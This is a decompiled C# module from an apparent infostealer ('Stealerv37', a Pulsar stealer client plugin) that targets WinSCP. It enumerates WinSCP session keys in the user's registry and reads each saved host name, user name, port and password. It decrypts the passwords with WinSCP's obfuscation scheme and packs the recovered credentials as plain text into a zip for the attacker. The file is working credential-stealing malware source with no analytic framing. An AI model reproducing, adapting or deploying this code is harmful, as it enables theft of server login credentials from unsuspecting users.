// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.WinSCP
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Applications;

public class WinSCP : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    List<string> values = new List<string>();
    List<string> stringList = new List<string>();
    try
    {
      using (RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
      {
        if (registryKey1 == null)
          return;
        foreach (string subKeyName in registryKey1.GetSubKeyNames())
        {
          string name = "Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + subKeyName;
          using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name))
          {
            if (registryKey2 != null)
            {
              string host = registryKey2.GetValue("HostName")?.ToString();
              if (!string.IsNullOrWhiteSpace(host))
              {
                string user = registryKey2.GetValue("UserName")?.ToString();
                string pass = registryKey2.GetValue("Password")?.ToString();
                string str1 = WinSCP.DecryptPassword(user, pass, host);
                string str2 = registryKey2.GetValue("PortNumber")?.ToString();
                values.Add($"Session: {subKeyName}\nUrl: {host}:{str2}\nUsername: {user}\nPassword: {str1}");
                stringList.Add("HKEY_CURRENT_USER\\" + name);
              }
            }
          }
        }
      }
    }
    catch
    {
    }
    if (values.Count <= 0)
      return;
    string entryPath = "WinScp\\Sessions.txt";
    zip.AddTextFile(entryPath, string.Join("\n\n", (IEnumerable<string>) values));
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (WinSCP);
    foreach (string str in stringList)
      counterApplications.Files.Add($"{str} => {entryPath}");
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }

  private static int DecryptNextChar(List<string> charList)
  {
    return (int) byte.MaxValue ^ ((int.Parse(charList[0]) << 4) + int.Parse(charList[1]) ^ 163) & (int) byte.MaxValue;
  }

  private static string DecryptPassword(string user, string pass, string host)
  {
    if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(pass))
    {
      if (!string.IsNullOrEmpty(host))
      {
        try
        {
          List<string> list = pass.Select<char, string>((Func<char, string>) (c => c.ToString())).ToList<string>();
          List<string> charList = new List<string>();
          foreach (string str in list)
          {
            switch (str)
            {
              case "A":
                charList.Add("10");
                continue;
              case "B":
                charList.Add("11");
                continue;
              case "C":
                charList.Add("12");
                continue;
              case "D":
                charList.Add("13");
                continue;
              case "E":
                charList.Add("14");
                continue;
              case "F":
                charList.Add("15");
                continue;
              default:
                charList.Add(str);
                continue;
            }
          }
          if (WinSCP.DecryptNextChar(charList) == (int) byte.MaxValue)
            WinSCP.DecryptNextChar(charList);
          charList.RemoveRange(0, 4);
          int num = WinSCP.DecryptNextChar(charList);
          charList.RemoveRange(0, 2);
          int count = WinSCP.DecryptNextChar(charList) * 2;
          charList.RemoveRange(0, count);
          string str1 = "";
          for (int index = 0; index < num; ++index)
          {
            str1 += ((char) WinSCP.DecryptNextChar(charList)).ToString();
            charList.RemoveRange(0, 2);
          }
          string oldValue = user + host;
          return str1.Replace(oldValue, "");
        }
        catch
        {
          return "";
        }
      }
    }
    return "";
  }
}
